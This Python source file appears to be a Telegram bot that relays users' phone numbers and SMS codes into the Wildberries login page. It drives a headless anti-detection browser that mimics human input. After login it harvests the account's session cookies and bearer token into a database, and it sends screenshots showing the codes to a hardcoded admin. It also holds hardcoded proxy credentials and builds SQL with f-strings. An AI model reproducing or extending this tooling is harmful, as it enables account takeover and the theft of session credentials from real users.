import datetime
import json
import os
import multiprocessing
import random
import asyncio
import re
import shutil
import time
from typing import Optional

import telebot
import asyncpg
import psutil
import asyncio

from camoufox.async_api import AsyncCamoufox
from browserforge.fingerprints import Screen

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import StaleElementReferenceException, TimeoutException, NoSuchElementException
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.keys import Keys

from tasks.check_sms_code import check_sms_code_requests, clear_sms_code
from utils.database.edit_database import clear_db_auth_user
from configuration_bot.settings import config
from utils.selenium_dop_bot_utils.dop_functions_bot import sms_registration, bad_registration, good_registration
from utils.selenium_dop_bot_utils.workers_db_selenium import update_selenium_process_table, update_proxies_status
from antibot_system.antibot_logger import logger
from utils.database.get_async_session_db import get_db_connection

bot = telebot.TeleBot(config.TG_TOKEN.get_secret_value())

DB_CONFIG = {
    'user': config.PG_USER,
    'password': config.PG_PASSWORD.get_secret_value(),
    'database': config.PG_DB_INTERNAL,
    'host': config.PG_HOST.get_secret_value(),
    'port': config.PG_PORT
}
constrains = Screen(
    max_width=1920,
    max_height=1080
)

proxy = {
    "server": "http://94.143.43.213:30609",
    "username": "admin",
    "password": "admin"
}

# Селекторы для проверки авторизации
element_logged_in = '[data-wba-header-name="LK"]'  # Элемент для авторизованного пользователя
element_logged_out = '[data-wba-header-name="Login"]'  # Элемент для неавторизованного пользователя

def parse_time(text):
    # Извлекает время вида 23:34:53 и возвращает timedelta
    match = re.search(r'(\d+):(\d+):(\d+)', text)
    if not match:
        return None
    hours, minutes, seconds = map(int, match.groups())
    return datetime.timedelta(hours=hours, minutes=minutes, seconds=seconds)


def check_sms_block_conditions(driver, chat_id):
    try:
        # Проверка: "Не прошло время для повторной отправки..."
        span_block = driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/form/div/div[2]/span[2]")
        text = span_block.text.strip()
        if text.startswith("Не прошло время"):
            bot.send_message(chat_id,
                             f"<b>❌ Извините, но для Вас, авторизация временно недоступна.</b> Попробуйте позже.\n\n"
                             f"<b>Причина: ⏳ {text}</b>", parse_mode="HTML")
            print(f"[{chat_id}] — Ожидание лимита на запрос кода: {text}")
            driver.quit()
            return False

    except NoSuchElementException:
        pass

    try:
        countdown_block = driver.find_element(By.CSS_SELECTOR, "div.login__countdown")
        text = countdown_block.text.strip()
        time_left = parse_time(text)
        if time_left and time_left.total_seconds() > 3600:  # > 1 час
            bot.send_message(chat_id,
                             "<b>❌ Извините, но для Вас, авторизация временно недоступна.</b> Попробуйте позже.\n\n"
                             "<b>Причина: ⏳ {text}</b>", parse_mode="HTML")
            print(f"[{chat_id}] — Ожидание лимита на запрос кода: {text}")
            driver.quit()
            return False

    except NoSuchElementException:
        pass  # Элемент не найден — продолжаем

    return True  # Всё нормально — продолжаем авторизацию


def create_selenium_processes():
    """
    Создаем процессы Selenium - для распредления задач.

    :param
        process_ids: int
    :return:
    """
    process_lst = []
    process_ids = list(range(1, 12))
    asyncio.run(update_selenium_process_table(process_ids))

    for process_id in process_ids:
        p = multiprocessing.Process(target=start_selenium_process, args=(process_id,))
        print(f"Запущен процесс Selenium-{process_id}, PID: {p.pid}")
        process_lst.append(p)
        p.start()

    for p in process_lst:
        p.join()


def start_selenium_process(process_id):
    """
    Запускаем Selenium-процесыы.
    :param process_id: int
    :return:
    """
    time.sleep(random.randint(3, 5))
    print(f'запущен процесс {process_id}')
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(handle_selenium_loop(process_id))


async def update_last_auth_try_time(chat_id):
    conn = await asyncpg.connect(**DB_CONFIG)
    try:
        existing = await conn.fetchval("SELECT 1 FROM auth_user WHERE chat_id = $1", chat_id)
        if existing:
            await conn.execute("UPDATE auth_user SET last_auth_try_time = now() WHERE chat_id = $1", chat_id)
        else:
            await conn.execute("INSERT INTO auth_user (chat_id, last_auth_try_time) VALUES ($1, now())", chat_id)
        print(f"[{chat_id}] - Обновлено или вставлено поле last_auth_try_time")
    finally:
        await conn.close()


async def handle_selenium_loop(process_id):
    """
    Запускаем обработчики событий Selenium
    :param process_id:
    :return:
    """
    conn = await asyncpg.connect(**DB_CONFIG)
    try:
        while True:
            chat_data = await conn.fetchrow(f'''
                SELECT chat_id, phone_number, proxy_name, proxy_id, user_agent 
                FROM auth_user 
                WHERE selenium_id = {process_id}
            ''')
            if chat_data:
                chat_id = chat_data["chat_id"]
                phone_number = chat_data["phone_number"]
                proxy_name = chat_data["proxy_name"]
                proxy_id = chat_data["proxy_id"]
                user_agent = chat_data["user_agent"]
                print(f"Успешно пришли данные: chat_id = {chat_id}, proxy = {proxy_name}")
                try:
                    result = WildberriesSeleniumAuth(
                        process_id, phone_number, chat_id,
                        proxy_name, proxy_id, user_agent
                    )

                    try:
                        auth_result = await result.authorize_user()

                        print(f"Результат: {auth_result}")

                        if auth_result:
                            # Успешная авторизация
                            await good_registration(user_id=chat_id)
                            admin_ids = [687061691]

                            for adm in admin_ids:
                                try:
                                    bot.send_message(adm, f"<b>🔔 Успешно авторизовался пользователь</b>\n\n"
                                                          f"• UserId: {chat_id}\n"
                                                          f"• Phone: {phone_number}", parse_mode="HTML")
                                except Exception as e:
                                    print(f"Ошибка при отправке успешной авторизации Админу: {e}")
                        else:
                            # Ошибка авторизации
                            raise Exception("Авторизация вернула код 500 или None")

                    except Exception as e:
                        print(f"Ошибка авторизации: {e}")
                        await bad_registration(user_id=chat_id, errors=e)
                        await clear_db_auth_user(chat_id)
                        await update_proxies_status(proxy_id)
                        await update_last_auth_try_time(str(chat_id))

                except Exception as e:
                    print(f"Ошибка при запуске Selenium-процесса: {e}")
                    await bad_registration(user_id=chat_id, errors=e)
                    await clear_db_auth_user(chat_id)
                    await update_proxies_status(proxy_id)

                await conn.execute(
                    f'UPDATE selenium_process SET is_busy = false WHERE process_id = {process_id}'
                )
                await conn.execute('''
                    UPDATE auth_user SET selenium_id = 0 
                    WHERE selenium_id = $1 AND chat_id = $2 AND phone_number = $3
                ''', process_id, chat_id, phone_number)
            await asyncio.sleep(5)
    finally:
        await conn.close()


class WildberriesSeleniumAuth:
    """
    Модуль обработчиков событий Selenium
    """

    def __init__(self, selenium_id, phone_number, chat_id, proxy_name, proxy_id, user_agent):
        self.chat_id = chat_id
        self.phone_number = phone_number
        self.selenium_id = selenium_id
        self.process_id = selenium_id
        self.driver = None
        self.user_agent = user_agent
        self.proxy_name = proxy_name
        # self.user_data_dir = f"C:/Users/zalit/PycharmProjects/ManagersAuthorizationBot/profiles/{self.chat_id}_{self.phone_number}"
        # self.user_data_dir = f"/mnt/c/Users/User2/PycharmProjects/ManagersAuthorizationBot/profiles/{self.chat_id}_{self.phone_number}"
        # self.profile_name = "Default"

    async def authorize_user(self):
        logger.info("Инициализация браузера...")

        async with AsyncCamoufox(
                screen=constrains,
                headless=True,
                locale="ru-RU",
                os="windows",
                proxy=None,
                geoip=False,
                block_images=True,
                humanize=True
        ) as browser:
            logger.info("Браузер инициализирован (запущен).")
            page = await browser.new_page()

            await page.goto("https://www.wildberries.ru/security/login?returnUrl=https%3A%2F%2Fwww.wildberries.ru%2F")
            logger.info("Страница загружена, ищу селектор ячейки ввода номера телефона.")

            await asyncio.sleep(2)

            await self.snapshot(f"Начал обработку авторизации юзера ({self.phone_number}) : Загрузил страницу", page)

            if await self.check_authentication(page):
                logger.info("Пользователь уже авторизован. Пропускаю авторизацию...")

                bot.send_message(self.chat_id, f"<b>Спасибо ☺️</b>\n\n"
                                               f"🟢 Я успешно вошел в Ваш аккаунт.\n\n"
                                               f"<b>Остался последний этап… 🤌</b>", parse_mode="HTML")

                await self.store_auth_success(page)
                await self.complete_success()

                await asyncio.sleep(5)
                return True

            # Ожидаем, пока элемент ячейки появится
            phone_selector = '#spaAuthForm > div > div > div.inputWrapper--MGUCa > input'
            await page.wait_for_selector(phone_selector,
                                         timeout=30000)  # тайм-аут до 30 секунд, если не нашел сразу

            phone_el = await page.query_selector(phone_selector)

            # Проверка найден ли селектор
            if phone_el:
                await phone_el.fill(self.phone_number)
                await phone_el.press("Tab")
                logger.info("Селектор найден, Номер телефона успешно введен.")
            else:
                logger.warning("Селектор не найден, номер не введен.")

            # Нажимаем кнопку Получить код через JS Path
            code_button_request = 'document.querySelector("#requestCode").click()'  # Кнопка Запросить код

            try:
                await page.evaluate(code_button_request)
                logger.info("Нажал кнопку «Получить код»")
            except Exception as e:
                logger.warning(f"Не удалось нажать на кнопку «Получить код»: {e}")

            # Ждём код от юзера и вводим
            logger.info(f"Ожидаю ввод кода от пользователя {self.phone_number}")
            await self.snapshot("Кнопка Получить Код нажата. Ожидаю ввод кода от пользователя", page)
            user_code: Optional[str] = await self.await_code_input(flag_retry=True)

            # Вводим код-получения
            code_input_selector = '#spaAuthForm > div > div.charInputBlock--B8MB2 > div > div:nth-child(1) > input'
            await page.wait_for_selector(code_input_selector, timeout=30000)

            code_el = await page.query_selector(code_input_selector)

            if code_el:
                await code_el.fill(user_code)
                await code_el.press("Tab")
                logger.info("Селектор найден, «Код получения» успешно введен.")
                await self.snapshot(f"Получен код от пользовать - {user_code}. Смотрим авторизацию", page)
            else:
                logger.warning("Селектор не найден, «Код получения» не введен.")

            await asyncio.sleep(5)

            await self.snapshot(f"Смотрим авторизацию пользователя: {self.phone_number}", page)

            if await self.check_authentication(page):
                logger.info("Пользователь успешно авторизован после ввода кода.")
                await self.store_auth_success(page)
                await self.complete_success()

                return True

            await self.snapshot(f"Получен код от пользовать - {user_code}. Возможно код не подошел. Смотрим Ошибки и пробуем еще раз", page)
            # Ищем селекторы ошибки кода или запрос нового кода
            error_code_input_selector = "#spaAuthForm > div > div.charInputBlock--B8MB2 > p"  # Неверный код/Запросите новый код
            timer_retry_new_req_selector = 'document.querySelector("#spaAuthForm > div > p.loginCountdown--t_mMs") === null'  # таймер ожидания для запроса нового кода

            # Ставим условие, если данный селектор получился значит,
            # нужно ждать таймер для запроса нового кода и пробовать ввести новый код

            error_el = await page.wait_for_selector(error_code_input_selector,
                                                    timeout=60000)  # Ожидаем появления ошибки
            error_code_retry = 0

            if error_el:
                logger.warning("Код неверный. Ожидаем таймер для запроса нового кода...")

                bot.send_message(self.chat_id, f"<b>❌ Введенный Вами - код, оказался «НЕВЕРНЫМ» 😢</b>\n\n"
                                               f"Я отправлю запрос на повторное получение кода на протяжении <b>2-ух минут.</b>\n\n"
                                               f"<b>⏳ Ожидайте…</b>", parse_mode="HTML")
                # Ждем, пока исчезнет таймер
                await page.wait_for_function(
                    timer_retry_new_req_selector,
                    timeout=180000
                )
                logger.info("Таймер для запроса нового кода исчез.")

                try:
                    await page.evaluate(code_button_request)
                    logger.info("Запрашиваем новый код.")

                    bot.send_message(self.chat_id, "<b>🔁 Отправил повторный код. Введите его.</b>\n\n"
                                                   "<b>💬 Подсказка:</b> если вдруг повторный код <b>Вам</b> не прийдет - попробуйте ввести предыдущий код (возможно вы ошиблись в цифре).",
                                     parse_mode="HTML"
                                     )
                    async with get_db_connection() as conn:
                        await conn.execute(
                            "UPDATE auth_user SET auth_state = 'waiting_sms_code' WHERE chat_id = $1",
                            str(self.chat_id)
                        )
                except Exception as e:
                    logger.warning(f"Не удалось найти кнопку запроса нового кода: {e}")

                logger.info(f"Ожидаю ввод повторного кода от пользователя {self.phone_number}")
                await self.snapshot("Кнопка Получить Код (Повторный) нажата. Ожидаю ввод кода от пользователя", page)
                user_code: Optional[str] = await self.await_code_input()

                await page.wait_for_selector(code_input_selector, timeout=30000)
                code_el = await page.query_selector(code_input_selector)

                if code_el:
                    await code_el.fill(user_code)  # Новый код
                    await code_el.press("Tab")
                    logger.info("Новый код успешно введен.")
                else:
                    logger.warning("Селектор для ввода нового кода не найден.")

            await asyncio.sleep(5)

            await self.snapshot(f"Смотрим авторизацию пользователя: {self.phone_number}", page)

            if await self.check_authentication(page):
                logger.info("Пользователь успешно авторизован.")

                await self.store_auth_success(page)
                await self.complete_success()
                return True


    async def check_authentication(self, page):
        """Проверка, авторизован ли пользователь"""
        # Ищем элемент для авторизованного пользователя
        auth_element = await page.query_selector(element_logged_in)
        if auth_element:
            logger.info("Пользователь авторизован.")
            return True
        else:
            # Ищем элемент для неавторизованного пользователя
            login_element = await page.query_selector(element_logged_out)
            if login_element:
                logger.warning("Пользователь не авторизован.")
            return False

    async def await_code_input(
            self,
            flag_retry: Optional[bool] = False
    ):
        if flag_retry:
            await sms_registration(user_id=int(self.chat_id), attempt_number=1)
        code = None

        logger.info(f"Ожидаю получение кода от юзера...")

        while True:
            await asyncio.sleep(2)

            try:
                code = await check_sms_code_requests(user_id=str(self.chat_id))
                if code:
                    logger.info(f"Получен код: {code}")
                    await clear_sms_code(str(self.chat_id))
                    break
            except Exception as e:
                logger.warning(f"Ошибка check_sms_code_requests: {type(e).__name__}: {e}")
                continue

        return str(code)

    async def complete_success(self):
        conn = await asyncpg.connect(**DB_CONFIG)
        try:
            await conn.execute("UPDATE selenium_process SET is_busy = false WHERE process_id = $1", self.process_id)
            await conn.execute("""
                UPDATE auth_user SET selenium_id = 0 
                WHERE selenium_id = $1 AND chat_id = $2 AND phone_number = $3
            """, self.process_id, self.chat_id, self.phone_number)
        finally:
            await conn.close()

    async def store_auth_success(self, page):
        try:
            # 1. Получаем cookies
            cookies_list = await page.context.cookies()
            print(cookies_list)
            cookies_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies_list])

            # 2. Получаем токен из localStorage
            token_data_raw = await page.evaluate(
                'localStorage.getItem("wbx__tokenData")'
            )

            auth_token = ""
            if token_data_raw:
                try:
                    auth_token = 'Bearer ' + json.loads(token_data_raw).get("token", "")
                except Exception as e:
                    logger.info(f"Ошибка парсинга токена: {e}")

            # 3. Записываем в базу данных
            conn = await asyncpg.connect(**DB_CONFIG)
            try:
                await conn.execute("""
                       UPDATE auth_user 
                       SET is_verified = true, cookies = $1, auth_token = $2
                       WHERE chat_id = $3 AND phone_number = $4
                   """,
                                   cookies_str,
                                   auth_token,
                                   self.chat_id,
                                   self.phone_number
                                   )
            finally:
                await conn.close()

            logger.info("Данные успешно записаны в БД")

        except Exception as e:
            logger.info(f"Общая ошибка: {e}")

    async def snapshot(self, step_name: str, page):
        timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        import os
        os.makedirs("screenshots", exist_ok=True)

        safe_step = step_name.replace("/", "_").replace("\\", "_")
        filename = f"screenshots/{self.phone_number}_{safe_step}_{timestamp}.png"

        # Playwright screenshot
        await page.screenshot(path=filename, full_page=True)

        with open(filename, "rb") as img:
            bot.send_photo(687061691, img, caption=f"{step_name} @ {timestamp}")

        await asyncio.sleep(1)

        try:
            os.remove(filename)
            logger.info(f"[{self.chat_id}] Скриншот {filename} удалён после отправки")
        except Exception as e:
            logger.warning(f"[{self.chat_id}] Ошибка при удалении скриншота {filename}: {e}")


if __name__ == "__main__":
    create_selenium_processes()